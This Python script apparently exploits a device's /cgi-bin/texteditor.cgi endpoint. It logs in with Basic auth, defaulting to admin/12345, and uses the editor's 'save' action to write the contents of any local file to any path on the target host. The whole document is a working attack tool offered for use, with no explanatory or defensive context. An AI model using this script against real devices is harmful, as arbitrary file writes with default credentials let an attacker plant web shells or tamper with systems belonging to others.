#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import sys
import base64
import argparse
import requests
from urllib.parse import quote

class Parser(argparse.ArgumentParser):

    def __init__(self):
        super(Parser, self).__init__()

    @staticmethod
    def optparse():
        parser = argparse.ArgumentParser()
        parser.add_argument(
            "-i", "--ip", dest="ipAddress", metavar="ip", default="192.168.1.10",
            help="specify ip address (default: 192.168.1.10)"
        )
        parser.add_argument(
            "-p", "--port", dest="portNumber", metavar="port", default="80",
            help="specify port number (default: 80)"
        )
        parser.add_argument(
            "-u", "--name", dest="userName", metavar="name", default="admin",
            help="specify username (default: admin)"
        )
        parser.add_argument(
            "-k", "--pass", dest="userPass", metavar="pass", default="12345",
            help="specify userpass (default: 12345)"
        )
        parser.add_argument(
            "-d", "--upload-to", dest="remoteFilePath", metavar="path", required=True,
            help="upload file to specify remote path (default: None)"
        )
        parser.add_argument(
            "-s", "--upload-from", dest="localFilePath", metavar="path", required=True,
            help="upload file from specify local path (default: None)"
        )
        return parser.parse_args()

opt = Parser().optparse()

ip = opt.ipAddress
port = opt.portNumber
username = opt.userName
userpass = opt.userPass
cred = (base64.b64encode((username+':'+userpass).encode('utf-8'))).decode()
remote_path = opt.remoteFilePath
local_path = opt.localFilePath
payload_path = quote(remote_path)

headers = {
    "Authorization": "Basic {}".format(cred),
    "Content-Type": "application/x-www-form-urlencoded"
}

def main():
    try:
        if local_path:
            with open(local_path, encoding='utf-8') as f:
                payload_content = quote(f.read())

        payload = {
            "action": "save",
            "editor_file": payload_path,
            "editor_text": payload_content
        }

        if ip and port:
            r = requests.post("http://{}:{}/cgi-bin/texteditor.cgi".format(ip, port), headers=headers, data=payload, timeout=10)
        elif ip:
            r = requests.post("http://{}/cgi-bin/texteditor.cgi".format(ip), headers=headers, data=payload, timeout=10)
        else:
            print("[!] Unknown Command, Exit")
            sys.exit()
        if r.status_code == 200:
            print("[+] File {} Uploaded to {}".format(local_path, remote_path))
        else:
            print("[-] File Upload Failed:", ip, port, r.status_code)
        
    except Exception as e:
        print("[!] Error:", e)
        pass
    except BrokenPipeError:
        pass

if __name__ == '__main__':
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        print("[*] Stopped")
        sys.exit()
